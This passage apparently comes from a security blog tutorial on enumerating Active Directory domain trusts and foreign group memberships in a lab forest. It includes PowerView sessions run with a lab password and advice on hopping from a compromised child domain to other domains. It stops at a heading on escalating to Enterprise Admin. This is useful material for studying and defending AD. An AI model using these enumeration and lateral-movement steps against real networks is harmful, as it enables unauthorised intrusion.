+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">powerview</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">elswix</span><span class="p">:</span><span class="n">Password2</span>\<span class="n">!</span><span class="n">@dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">--</span><span class="n">use</span><span class="o">-</span><span class="n">gc</span>
+<span class="n">Logging</span> <span class="n">directory</span> <span class="n">is</span> <span class="nb">set</span> <span class="n">to</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">powerview</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">elswix</span><span class="o">-</span><span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">╭─</span><span class="n">GC</span><span class="n">─</span><span class="p">[</span><span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">]</span><span class="n">─</span><span class="p">[</span><span class="n">ELSWIXCORP</span>\<span class="n">elswix</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="n">NS</span><span class="p">:</span><span class="o">&lt;</span><span class="n">auto</span><span class="o">&gt;</span><span class="p">]</span>
+<span class="n">╰─</span><span class="n">PV</span> <span class="n">❯</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainTrust</span>
+<span class="n">objectClass</span>                   <span class="p">:</span> <span class="n">top</span>
+                                <span class="n">leaf</span>
+                                <span class="n">trustedDomain</span>
+<span class="n">whenCreated</span>                   <span class="p">:</span> <span class="mi">20</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">19</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">12</span> <span class="p">(</span><span class="n">today</span><span class="p">)</span>
+<span class="n">whenChanged</span>                   <span class="p">:</span> <span class="mi">20</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">19</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">27</span> <span class="p">(</span><span class="n">today</span><span class="p">)</span>
+<span class="n">name</span>                          <span class="p">:</span> <span class="n">hackencycorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">objectGUID</span>                    <span class="p">:</span> <span class="p">{</span><span class="mi">89</span><span class="n">bc6fbe</span><span class="o">-</span><span class="n">c452</span><span class="o">-</span><span class="mi">45</span><span class="n">fa</span><span class="o">-</span><span class="n">be38</span><span class="o">-</span><span class="n">ece01598545d</span><span class="p">}</span>
+<span class="n">securityIdentifier</span>            <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1884625752</span><span class="o">-</span><span class="mi">3355359237</span><span class="o">-</span><span class="mi">3723390849</span>
+<span class="n">trustDirection</span>                <span class="p">:</span> <span class="n">OUTBOUND</span>
+                                <span class="n">BIDIRECTIONAL</span>
+<span class="n">trustPartner</span>                  <span class="p">:</span> <span class="n">hackencycorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">trustType</span>                     <span class="p">:</span> <span class="n">WINDOWS_ACTIVE_DIRECTORY</span>
+                                <span class="n">MIT</span>
+<span class="n">trustAttributes</span>               <span class="p">:</span> <span class="n">QUARANTINED_DOMAIN</span>
+
+<span class="n">objectClass</span>                   <span class="p">:</span> <span class="n">top</span>
+                                <span class="n">leaf</span>
+                                <span class="n">trustedDomain</span>
+<span class="n">whenCreated</span>                   <span class="p">:</span> <span class="mi">19</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">20</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">11</span> <span class="p">(</span><span class="mi">1</span> <span class="n">month</span><span class="p">,</span> <span class="mi">1</span> <span class="n">day</span> <span class="n">ago</span><span class="p">)</span>
+<span class="n">whenChanged</span>                   <span class="p">:</span> <span class="mi">19</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">21</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">05</span> <span class="p">(</span><span class="mi">1</span> <span class="n">month</span><span class="p">,</span> <span class="mi">1</span> <span class="n">day</span> <span class="n">ago</span><span class="p">)</span>
+<span class="n">name</span>                          <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">objectGUID</span>                    <span class="p">:</span> <span class="p">{</span><span class="mi">2</span><span class="n">c503584</span><span class="o">-</span><span class="mi">40</span><span class="n">cc</span><span class="o">-</span><span class="mi">4</span><span class="n">a16</span><span class="o">-</span><span class="mi">81</span><span class="n">b4</span><span class="o">-</span><span class="n">efdd609a67f2</span><span class="p">}</span>
+<span class="n">securityIdentifier</span>            <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">2072161790</span><span class="o">-</span><span class="mi">1428925431</span><span class="o">-</span><span class="mi">1872385657</span>
+<span class="n">trustDirection</span>                <span class="p">:</span> <span class="n">INBOUND</span>
+                                <span class="n">OUTBOUND</span>
+                                <span class="n">BIDIRECTIONAL</span>
+<span class="n">trustPartner</span>                  <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">trustType</span>                     <span class="p">:</span> <span class="n">WINDOWS_ACTIVE_DIRECTORY</span>
+                                <span class="n">MIT</span>
+<span class="n">trustAttributes</span>               <span class="p">:</span> <span class="n">WITHIN_FOREST</span>
+
+<span class="n">objectClass</span>                   <span class="p">:</span> <span class="n">top</span>
+                                <span class="n">leaf</span>
+                                <span class="n">trustedDomain</span>
+<span class="n">whenCreated</span>                   <span class="p">:</span> <span class="mi">19</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">20</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">11</span> <span class="p">(</span><span class="mi">1</span> <span class="n">month</span><span class="p">,</span> <span class="mi">1</span> <span class="n">day</span> <span class="n">ago</span><span class="p">)</span>
+<span class="n">whenChanged</span>                   <span class="p">:</span> <span class="mi">20</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">01</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">20</span> <span class="p">(</span><span class="n">today</span><span class="p">)</span>
+<span class="n">name</span>                          <span class="p">:</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">objectGUID</span>                    <span class="p">:</span> <span class="p">{</span><span class="mi">4</span><span class="n">a300c81</span><span class="o">-</span><span class="n">b4a4</span><span class="o">-</span><span class="mi">4</span><span class="n">a88</span><span class="o">-</span><span class="n">b989</span><span class="o">-</span><span class="mi">4</span><span class="n">ff92ff49eb9</span><span class="p">}</span>
+<span class="n">securityIdentifier</span>            <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">119164063</span><span class="o">-</span><span class="mi">3581140015</span><span class="o">-</span><span class="mi">337040502</span>
+<span class="n">trustDirection</span>                <span class="p">:</span> <span class="n">INBOUND</span>
+                                <span class="n">OUTBOUND</span>
+                                <span class="n">BIDIRECTIONAL</span>
+<span class="n">trustPartner</span>                  <span class="p">:</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">trustType</span>                     <span class="p">:</span> <span class="n">WINDOWS_ACTIVE_DIRECTORY</span>
+                                <span class="n">MIT</span>
+<span class="n">trustAttributes</span>               <span class="p">:</span> <span class="n">WITHIN_FOREST</span>
+
+<span class="n">╭─</span><span class="n">GC</span><span class="n">─</span><span class="p">[</span><span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">]</span><span class="n">─</span><span class="p">[</span><span class="n">ELSWIXCORP</span>\<span class="n">elswix</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="n">NS</span><span class="p">:</span><span class="o">&lt;</span><span class="n">auto</span><span class="o">&gt;</span><span class="p">]</span>
+<span class="n">╰─</span><span class="n">PV</span> <span class="n">❯</span>
+</pre></div>
+<p>As shown, I connected to <code>elswixcorp.local</code>, but this time through the GC which returned additional information, including the trust relationship between <code>hackencycorp.local</code> and <code>it.elswixcorp.local</code>.</p><br/>
+<p>I also attempted to enumerate all trusts using bloodhound-python on <code>elswixcorp.local</code>, but it did not display the <code>hackencycorp.local</code> trust from <code>it.elswixcorp.local</code>. This happens because although BloodHound queries the GC at certain stages, it does not actually look for Domain Trust objects.</p><br/>
+<p>Since we can enumerate any trusts that our current domain context can access through the GC, and via LDAP referrals, query any <strong>(objectClass=trustedDomain)</strong> objects from domains that trust our current one, we can continue issuing these queries recursively and effectively identify trusts across any reachable domains. In upcoming articles, we’ll work in a local lab to move across domains and compromise a simulated enterprise.</p><br/>
+<p>There’s a PowerView function that automates this process: <strong>Get-DomainTrustMapping</strong>. However, this function wasn’t included in the Python-based implementation. There are, of course, alternative methods, but I’ll cover those in another article as mentioned earlier.</p><br/>
+<h3>Domain Hopping: Lateral movement</h3><br/>
+<p>Once you’ve successfully mapped the Domain Trusts, you can follow two main approaches:</p><br/>
+<p>If you have high-privilege access on a child domain (access to the <strong>krbtgt</strong> key) within a forest, then proceed directly to the <strong>Trustpocalypse</strong> section of the article.</p><br/>
+<p>If you don’t have elevated access in the child domain, you can still enumerate useful information related to the trust. The next step is to determine your best path to reach the target domain. For example, even if you’re unable to escalate privileges in the current domain, there may be users from this domain who have access to resources in other domains, either intra-forest or inter-forest.</p><br/>
+<p>You might discover users from the current (compromised) child domain who are nested inside groups belonging to other trusting domains. This could allow those users to access resources in those domains with a form of “privileged” access (privileged in the sense that they wouldn’t have any access at all if they weren’t nested in those groups). You may also encounter situations where users from the current domain hold interesting ACEs over objects in another domain.</p><br/>
+<h3>Foreign Group Membership Enumeration</h3><br/>
+<p>Before we start enumerating foreign group memberships, let’s go over a few key aspects of groups that can influence how the results are displayed. As mentioned earlier, the GC stores a partial copy of all objects in Active Directory—for example, all domain users are replicated to the forest’s Global Catalog. This is useful because, in theory, if we want to determine whether a user from our current domain belongs to a group in another domain, we could simply query the GC for that user and read the <em>memberOf</em> attribute, right?</p><br/>
+<p>Well, sort of. Before diving into that, let’s take a closer look at how the <em>memberOf</em> attribute works in Active Directory.</p><br/>
+<p>Group membership can get a little tricky. In Active Directory, the <em>member</em> attribute on a group and the <em>memberOf</em> attribute on a user or group form a linked relationship. Here, the <em>member</em> attribute is the forward link, and the <em>memberOf</em> attribute is the back link. Active Directory calculates the back link (for example, <em>memberOf</em> on a user or group object) based on the forward link stored in the group’s <em>member</em> list. In other words, <em>memberOf</em> isn’t something that’s directly saved on the user, it’s generated from whatever the group has recorded. In short, the group is what actually keeps track of its members, and <em>memberOf</em> is just the result of that relationship.</p><br/>
+<p>When trusts are involved, things can become less straightforward. Whether a user or group sees their foreign group memberships reflected in <em>memberOf</em> depends on the type of trust and the scope of the group on the other side.</p><br/>
+<p>Active Directory defines three group scopes, and each one behaves differently when it comes to cross-domain or cross-forest memberships:</p><br/>
+<ul>
+<li>
+<p><strong>Domain Local Groups</strong> can include users from anywhere—users from other domains in the same forest and even users from external or forest trusts (represented as foreign security principals). However, the key point is that their membership is stored only in the domain where the group lives. Because of this, the <em>member</em> attribute of Domain Local Groups is <strong>NOT replicated to the Global Catalog</strong>, so the GC can’t be used to reliably enumerate who belongs to these groups across the forest.</p><br/>
+</li>
+<li>
+<p><strong>Global Groups</strong> are far more restrictive. They can only contain members from their own domain, with no cross-domain or cross-forest memberships allowed. For our purposes, these are irrelevant, so let's ignore them.</p><br/>
+</li>
+<li>
+<p><strong>Universal Groups</strong> offer the widest reach inside a forest: they can include members from <strong>any domain within the same forest</strong>. Their membership <strong>IS replicated to the Global Catalog</strong>, which makes them easy to query and consistent across the entire forest. The limitation is that users from external or forest trusts (foreign security principals) cannot be added to Universal Groups, only forest-internal accounts can be added to these groups.</p><br/>
+</li>
+</ul>
+<p>In practice, this means that when we try to determine whether a user belongs to a foreign group in another domain, the Global Catalog will only reveal memberships in <strong>Universal Groups</strong> through the user’s <em>memberOf</em> attribute. For example, if a user is a member of a Domain Local group in another domain, a GC-only query won’t show that relationship, the <em>memberOf</em> attribute simply won’t include that Domain Local group because its <em>member</em> attribute isn’t replicated to the GC. But if the user is nested inside a Universal Group, then things change, because Universal Groups have their <em>member</em> attribute replicated to the GC, the user’s <em>memberOf</em> attribute will correctly reflect that Universal Group membership.</p><br/>
+<p>Therefore, if you want to determine whether a user in your current domain (or another domain) is a member of a foreign group, that is, a group that doesn’t belong to the user’s own domain, you need to take a two-step approach. First, query the Global Catalog to identify any Universal Group memberships. After that, you must query each individual domain directly to uncover any Domain Local group memberships, since those are not reflected in the GC.</p><br/>
+<h3>Foreign Security Principals</h3><br/>
+<p>The same applies to <strong>Foreign Security Principals (FSPs)</strong>, which are AD objects created when a security principal (a user or group) from an external domain (a domain outside the forest) is added to a Domain Local group. But how do FSPs actually work?</p><br/>
+<p>As mentioned, FSPs are placeholders, lightweight AD objects that represent external security principals within the local domain. When an external account is added to a Domain Local group, Active Directory doesn’t store the full object, because the real identity lives in another forest. Instead, it creates an FSP with a special SID in the <strong>Foreign Security Principals</strong> container. This SID matches the external account’s SID, allowing the local domain to refer to it consistently when evaluating access.</p><br/>
+<p>Because FSPs are just SID-based stubs, they come with a few important limitations:</p><br/>
+<ul>
+<li>
+<p>They can <strong>only</strong> be members of <strong>Domain Local groups</strong>.</p><br/>
+</li>
+<li>
+<p>They <strong>cannot</strong> be added to <strong>Global</strong> or <strong>Universal groups</strong>, since those group scopes require full, forest-internal objects with attributes that can be replicated and resolved across the forest.</p><br/>
+</li>
+<li>
+<p>Their membership information is stored only in the domain’s local database, which means it is <strong>not replicated to the Global Catalog</strong>.</p><br/>
+</li>
+</ul>
+<p>As a result, if an external user (represented locally as an FSP) is added to a Domain Local group, the GC will never show that membership in the user’s <em>memberOf</em> attribute. Only by querying the specific domain where that Domain Local group lives can that relationship be discovered.</p><br/>
+<p>Fortunately, FSP objects <em>themselves</em> are replicated to the Global Catalog, although their <em>memberOf</em> attribute is not. This still gives us something useful: an FSP’s <strong>distinguishedName</strong> clearly indicates the domain where it was created. With that information, we can extract the domain portion of the DN and then query that specific domain directly to obtain the FSP’s actual <em>memberOf</em> attribute. In other words, the GC helps us locate <strong>where</strong> the foreign membership is stored, and then we can query the originating domain to retrieve the membership details, just as we would for users in a foreign domain within the same forest, as explained earlier.</p><br/>
+<p>Let's try this using PowerView. First, we’ll connect to the GC and search for FSPs.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">powerview</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">elswix</span><span class="p">:</span><span class="n">Password2</span>\<span class="n">!</span><span class="n">@dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">--</span><span class="n">use</span><span class="o">-</span><span class="n">gc</span>
+<span class="n">Logging</span> <span class="n">directory</span> <span class="n">is</span> <span class="nb">set</span> <span class="n">to</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">powerview</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">elswix</span><span class="o">-</span><span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">╭─</span><span class="n">GC</span><span class="n">─</span><span class="p">[</span><span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">]</span><span class="n">─</span><span class="p">[</span><span class="n">ELSWIXCORP</span>\<span class="n">elswix</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="n">NS</span><span class="p">:</span><span class="o">&lt;</span><span class="n">auto</span><span class="o">&gt;</span><span class="p">]</span>
+<span class="n">╰─</span><span class="n">PV</span> <span class="n">❯</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainObject</span> <span class="o">-</span><span class="n">LDAPFilter</span> <span class="s2">"(objectClass=foreignSecurityPrincipal)"</span> <span class="o">-</span><span class="n">Properties</span> <span class="n">distinguishedName</span> 
+<span class="n">distinguishedName</span>     <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1884625752</span><span class="o">-</span><span class="mi">3355359237</span><span class="o">-</span><span class="mi">3723390849</span><span class="o">-</span><span class="mi">1104</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">ForeignSecurityPrincipals</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">D</span>
+                        <span class="n">C</span><span class="o">=</span><span class="n">local</span>
+
+<span class="n">distinguishedName</span>     <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">9</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">ForeignSecurityPrincipals</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+
+<span class="n">distinguishedName</span>     <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">17</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">ForeignSecurityPrincipals</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+
+<span class="n">╭─</span><span class="n">GC</span><span class="n">─</span><span class="p">[</span><span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">]</span><span class="n">─</span><span class="p">[</span><span class="n">ELSWIXCORP</span>\<span class="n">elswix</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="n">NS</span><span class="p">:</span><span class="o">&lt;</span><span class="n">auto</span><span class="o">&gt;</span><span class="p">]</span>
+<span class="n">╰─</span><span class="n">PV</span> <span class="n">❯</span>
+</pre></div>
+<p>As shown, an FSP was found. By leveraging its <code>distinguishedName</code>, we can extract the domain portion and query that domain’s LDAP service to identify the Domain Local groups the FSP is a member of.</p><br/>
+<p>The <code>distinguishedName</code> is <code>CN=S-1-5-21-1884625752-3355359237-3723390849-1104,CN=ForeignSecurityPrincipals,DC=it,DC=elswixcorp,DC=local</code>, so the domain is <code>it.elswixcorp.local</code>. Now, let's connect to the LDAP service for <code>it.elswixcorp.local</code> and look for its Domain Local group memberships.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">powerview</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">elswix</span><span class="p">:</span><span class="n">Password2</span>\<span class="n">!</span><span class="n">@it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">Logging</span> <span class="n">directory</span> <span class="n">is</span> <span class="nb">set</span> <span class="n">to</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">powerview</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">elswix</span><span class="o">-</span><span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">╭─</span><span class="n">LDAP</span><span class="n">─</span><span class="p">[</span><span class="n">ITDC01</span><span class="o">.</span><span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">]</span><span class="n">─</span><span class="p">[</span><span class="n">ELSWIXCORP</span>\<span class="n">elswix</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="n">NS</span><span class="p">:</span><span class="o">&lt;</span><span class="n">auto</span><span class="o">&gt;</span><span class="p">]</span>
+<span class="n">╰─</span><span class="n">PV</span> <span class="n">❯</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainGroup</span> <span class="o">-</span><span class="n">Where</span> <span class="s2">"member contains S-1-5-21-1884625752-3355359237-3723390849-1104"</span>
+<span class="n">cn</span>                    <span class="p">:</span> <span class="n">DB</span> <span class="n">Admins</span>
+<span class="n">member</span>                <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1884625752</span><span class="o">-</span><span class="mi">3355359237</span><span class="o">-</span><span class="mi">3723390849</span><span class="o">-</span><span class="mi">1104</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">ForeignSecurityPrincipals</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+                        <span class="n">CN</span><span class="o">=</span><span class="n">ellie</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+<span class="n">distinguishedName</span>     <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">DB</span> <span class="n">Admins</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+<span class="n">instanceType</span>          <span class="p">:</span> <span class="mi">4</span>
+<span class="n">name</span>                  <span class="p">:</span> <span class="n">DB</span> <span class="n">Admins</span>
+<span class="n">objectGUID</span>            <span class="p">:</span> <span class="p">{</span><span class="n">fafb1a5f</span><span class="o">-</span><span class="n">c4d6</span><span class="o">-</span><span class="mi">4</span><span class="n">c28</span><span class="o">-</span><span class="n">b98f</span><span class="o">-</span><span class="mi">2</span><span class="n">c96603354d1</span><span class="p">}</span>
+<span class="n">objectSid</span>             <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">119164063</span><span class="o">-</span><span class="mi">3581140015</span><span class="o">-</span><span class="mi">337040502</span><span class="o">-</span><span class="mi">1106</span>
+<span class="n">sAMAccountName</span>        <span class="p">:</span> <span class="n">DB</span> <span class="n">Admins</span>
+<span class="n">sAMAccountType</span>        <span class="p">:</span> <span class="n">SAM_ALIAS_OBJECT</span>
+<span class="n">groupType</span>             <span class="p">:</span> <span class="o">-</span><span class="mi">2147483644</span>
+<span class="n">objectCategory</span>        <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Group</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+
+<span class="n">cn</span>                    <span class="p">:</span> <span class="n">Administrators</span>
+<span class="n">description</span>           <span class="p">:</span> <span class="n">Administrators</span> <span class="n">have</span> <span class="n">complete</span> <span class="n">and</span> <span class="n">unrestricted</span> <span class="n">access</span> <span class="n">to</span> <span class="n">the</span> <span class="n">computer</span><span class="o">/</span><span class="n">domain</span>
+<span class="n">member</span>                <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1884625752</span><span class="o">-</span><span class="mi">3355359237</span><span class="o">-</span><span class="mi">3723390849</span><span class="o">-</span><span class="mi">1104</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">ForeignSecurityPrincipals</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+                        <span class="n">CN</span><span class="o">=</span><span class="n">Enterprise</span> <span class="n">Admins</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+                        <span class="n">CN</span><span class="o">=</span><span class="n">Domain</span> <span class="n">Admins</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+                        <span class="n">CN</span><span class="o">=</span><span class="n">Administrator</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+<span class="n">distinguishedName</span>     <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Administrators</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Builtin</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">it</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+<span class="n">instanceType</span>          <span class="p">:</span> <span class="mi">4</span>
+<span class="n">name</span>                  <span class="p">:</span> <span class="n">Administrators</span>
+<span class="n">objectGUID</span>            <span class="p">:</span> <span class="p">{</span><span class="mf">552e073</span><span class="n">a</span><span class="o">-</span><span class="n">b6ae</span><span class="o">-</span><span class="mi">4</span><span class="n">a56</span><span class="o">-</span><span class="mi">9</span><span class="n">f45</span><span class="o">-</span><span class="n">b4471f5acd98</span><span class="p">}</span>
+<span class="n">objectSid</span>             <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">544</span>
+<span class="n">adminCount</span>            <span class="p">:</span> <span class="mi">1</span>
+<span class="n">sAMAccountName</span>        <span class="p">:</span> <span class="n">Administrators</span>
+<span class="n">sAMAccountType</span>        <span class="p">:</span> <span class="n">SAM_ALIAS_OBJECT</span>
+<span class="n">groupType</span>             <span class="p">:</span> <span class="o">-</span><span class="mi">2147483643</span>
+<span class="n">objectCategory</span>        <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Group</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+
+<span class="n">╭─</span><span class="n">LDAP</span><span class="n">─</span><span class="p">[</span><span class="n">ITDC01</span><span class="o">.</span><span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">]</span><span class="n">─</span><span class="p">[</span><span class="n">ELSWIXCORP</span>\<span class="n">elswix</span><span class="p">]</span><span class="o">-</span><span class="p">[</span><span class="n">NS</span><span class="p">:</span><span class="o">&lt;</span><span class="n">auto</span><span class="o">&gt;</span><span class="p">]</span>
+<span class="n">╰─</span><span class="n">PV</span> <span class="n">❯</span>
+</pre></div>
+<p>As shown, the FSP is a member of the <code>DB Admins</code> Domain Local group. The next step is to determine what privileges this group has. For example, any ACEs it holds in a DACL. Of course, the group name already hints at its potential privileges. In this case, you might be able to obtain high-privilege access to an MSSQL instance or something similar.</p><br/>
+<h3>Trustpocalypse: From Child DCSync to Enterprise Admin</h3><br/>
